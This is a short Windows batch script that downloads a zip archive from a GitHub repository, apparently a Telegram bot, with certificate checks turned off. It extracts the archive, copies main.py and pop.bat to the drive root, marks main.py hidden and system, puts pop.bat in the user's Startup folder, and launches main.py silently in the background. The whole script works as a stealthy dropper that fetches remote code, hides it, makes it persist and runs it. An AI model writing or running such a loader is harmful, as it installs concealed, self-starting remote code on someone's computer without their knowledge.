@echo off
cd /
curl -LOk https://github.com/Mrgdchauhan/pythpython-code-telegram-boat/archive/refs/heads/main.zip
tar -xf main.zip
del main.zip
cd pythpython-code-telegram-boat-main
copy main.py \
copy pop.bat \
cd \
rmdir /s /q pythpython-code-telegram-boat-main
attrib +h +s main.py
copy pop.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
del pop.bat
start /B pythonw.exe main.py
exit
